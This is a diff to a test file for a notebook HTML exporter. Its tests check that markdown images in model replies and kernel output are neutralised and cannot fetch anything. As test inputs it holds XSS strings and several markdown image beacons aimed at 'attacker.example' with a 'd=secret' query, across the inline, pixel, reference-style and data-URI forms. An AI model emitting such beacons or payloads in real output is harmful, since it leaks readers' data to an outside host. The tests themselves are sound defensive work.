@@ -59,11 +59,94 @@ describe('a text/markdown output exports as rendered prose', () => {
 		expect(html).not.toContain('katex');
 	});
 
-	it('renders no raw HTML from the model (html:false is what makes the sanitizer unnecessary)', () => {
+	it('renders no raw HTML from the model (html:false escapes it to text)', () => {
 		const html = render(chatCell('Careful: <img src=x onerror=alert(1)> and <script>alert(2)</script>'));
 		expect(html).not.toContain('<img src=x');
 		expect(html).not.toContain('<script>alert(2)');
 		expect(html).toContain('&lt;script&gt;');
+	});
+});
+
+/**
+ * The SAME no-fetch rule the app applies, pinned here against the SAME cases -
+ * the export has no DOM and so cannot share the app's sanitizer, and this is the
+ * worse of the two leaks: the beacon fires in every READER's browser when they
+ * open the shared report, not just the author's.
+ *
+ * `html:false` escapes RAW html but does NOT touch markdown-it's own image rule,
+ * so `![](url)` was still emitted as a live `<img src>` here.
+ */
+describe('a machine-emitted text/markdown output never fetches in the exported report', () => {
+	const fetchingElements = (html: string): string[] =>
+		Array.from(html.matchAll(/<(img|picture|source|video|audio|track|embed|object|iframe|input)\b/gi)).map((m) =>
+			m[1].toLowerCase()
+		);
+
+	it('an image in a reply becomes its alt text, and its URL never reaches the document', () => {
+		const html = render(chatCell('Here: ![the summary chart](https://attacker.example/?d=secret)'));
+		expect(fetchingElements(html)).toEqual([]);
+		expect(html).not.toContain('attacker.example');
+		expect(html).toContain('the summary chart');
+	});
+
+	it('an image with no alt shows its URL as plain text, never as a loading element', () => {
+		const html = render(chatCell('![](https://attacker.example/pixel.gif?d=secret)'));
+		expect(fetchingElements(html)).toEqual([]);
+		expect(html).toContain('https://attacker.example/pixel.gif?d=secret');
+		expect(html).not.toMatch(/<img[^>]*attacker\.example/i);
+	});
+
+	it('every markdown image form is neutralised, not just the inline one', () => {
+		for (const reply of [
+			'![alt][ref]\n\n[ref]: https://attacker.example/x.png',
+			'![alt](data:image/png;base64,iVBORw0KGgo=)'
+		]) {
+			const html = render(chatCell(reply));
+			expect(fetchingElements(html)).toEqual([]);
+			expect(html).not.toContain('attacker.example');
+			expect(html).not.toContain('data:image/png;base64');
+		}
+	});
+
+	it('holds after the cell is RETYPED away from chat - the rule is about the OUTPUT', () => {
+		// A chat cell converted to code keeps its outputs, so a rule keyed on the
+		// cell's current type would re-open the channel here.
+		const retyped = chatCell('![a chart](https://attacker.example/after-retype.png)');
+		retyped.metadata = { cellar: {} };
+		const html = render(retyped);
+		expect(fetchingElements(html)).toEqual([]);
+		expect(html).not.toContain('attacker.example');
+		expect(html).toContain('a chart');
+	});
+
+	it('holds for a markdown table found in kernel OUTPUT text', () => {
+		const cell: CellView = {
+			id: 'c',
+			cell_type: 'code',
+			source: 'print(report)',
+			outputs: [
+				{ output_type: 'stream', name: 'stdout', text: '| a | b |\n|---|---|\n| ![a plot](https://attacker.example/t.png) | 2 |\n' }
+			],
+			metadata: {}
+		};
+		const html = render(cell);
+		expect(fetchingElements(html)).toEqual([]);
+		expect(html).not.toContain('attacker.example');
+	});
+
+	it('links stay clickable, and an authored markdown CELL keeps its images', () => {
+		const withLink = render(chatCell('[the docs](https://example.com/docs)'));
+		expect(withLink).toContain('href="https://example.com/docs"');
+
+		const mdCell: CellView = {
+			id: 'm',
+			cell_type: 'markdown',
+			source: 'text ![chart](https://example.com/chart.png) more',
+			outputs: [],
+			metadata: {}
+		};
+		const html = renderNotebookHtml({ cells: [mdCell], hideAllCode: false });
+		expect(html).toContain('<img src="https://example.com/chart.png"');
 	});
 });
 
